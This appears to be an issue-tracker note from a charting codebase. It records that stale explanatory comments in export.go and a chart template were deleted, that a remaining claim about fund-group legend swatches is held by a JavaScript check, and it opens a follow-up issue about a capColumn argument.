Every one of the four items is deleted rather than reworded, verified by grep over the tree: export.go's ChartSubject prose ('Revenue draws revenue categories into fund groups; Spending draws one fund into its divisions') and its Root prose ('Spending draws tiers {3,4} of fund-flows') went with the fields, and chart.html.tmpl:9 and :127-135 went with the template (fisc-1osz, 2026-09-20).

THE ONE ITEM THAT CARRIED A LIVE CLAIM IS COVERED, which is what this bead asked to be checked rather than assumed. chart.html.tmpl's fund-swatch measurement -- '6 buttons on revenue.html's overview, 0 on spending.html and 0 on all 29 opened views' -- documented a rule about which pages draw clickable fund-group swatches, and the live analogue is held by a check rather than by prose: tools/jscheck/fold.mjs's 'an opened view draws no legend even where a fund-group node survives the filter' drives a probe whose step keeps the group's own tier on the chart, so buildLegend's decision is falsifiable instead of being unreachable on the corpus. Nothing was carried across unmeasured, because nothing needed to be.

title: capColumn's cap argument is measured against a chart the site stopped drawing
description:
FALSE-CLAIM-adjacent, found while fixing fisc-4942's five comments.
